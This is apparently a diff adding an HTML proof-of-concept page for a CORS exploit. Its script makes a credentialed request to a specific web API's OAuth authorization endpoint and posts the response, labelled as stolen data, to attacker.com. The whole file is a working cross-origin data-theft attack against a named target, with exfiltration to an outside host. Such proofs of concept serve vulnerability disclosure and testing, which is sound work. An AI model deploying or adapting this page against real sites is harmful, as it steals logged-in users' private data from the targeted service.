@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>Hacked! Stealing your data...</h1>
+    <script>
+        fetch("https://power.on.is/OrcaWebApi//oAuthAuthorizeUrl?federationSystemId=10", {
+            method: "GET",
+            credentials: "include"
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log("Stolen Data:", data);
+            // Send stolen data to attacker's server
+            fetch("https://attacker.com/steal", {
+                method: "POST",
+                body: JSON.stringify({ stolenData: data }),
+                headers: { "Content-Type": "application/json" }
+            });
+        })
+        .catch(err => console.log("CORS Blocked:", err));
+    </script>
+</body>
+</html>
